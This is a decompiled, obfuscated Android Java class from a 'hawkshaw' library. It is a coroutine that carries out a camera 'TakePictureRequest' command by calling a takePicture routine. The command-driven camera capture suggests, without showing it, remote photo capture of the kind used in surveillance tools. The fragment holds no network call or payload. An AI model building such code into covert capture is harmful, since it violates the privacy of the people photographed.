package com.hawkshaw.library.features.media.camera;

import A.d;
import W2.y;
import Y1.C0110h;
import Y1.K;
import a3.e;
import android.content.Context;
import androidx.lifecycle.C0266w;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.datalayer.models.Command;
import i3.p;
import t3.E;

public final class f extends C0331i implements p {

    /* renamed from: D  reason: collision with root package name */
    public int f4994D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ Context f4995E;

    /* renamed from: F  reason: collision with root package name */
    public final /* synthetic */ C0266w f4996F;

    /* renamed from: G  reason: collision with root package name */
    public final /* synthetic */ Command.TakePictureRequest f4997G;

    /* renamed from: H  reason: collision with root package name */
    public final /* synthetic */ d f4998H;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public f(Context context, C0266w wVar, Command.TakePictureRequest takePictureRequest, d dVar, e eVar) {
        super(2, eVar);
        this.f4995E = context;
        this.f4996F = wVar;
        this.f4997G = takePictureRequest;
        this.f4998H = dVar;
    }

    public final e create(Object obj, e eVar) {
        return new f(this.f4995E, this.f4996F, this.f4997G, this.f4998H, eVar);
    }

    public final Object invoke(Object obj, Object obj2) {
        return ((f) create((E) obj, (e) obj2)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f4994D;
        if (i5 == 0) {
            C0110h.P(obj);
            d dVar = this.f4998H;
            K.m(dVar, "$cameraProvider");
            this.f4994D = 1;
            if (TakePictureKt.takePicture(this.f4995E, this.f4996F, this.f4997G, dVar, this) == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return y.f2418a;
    }
}
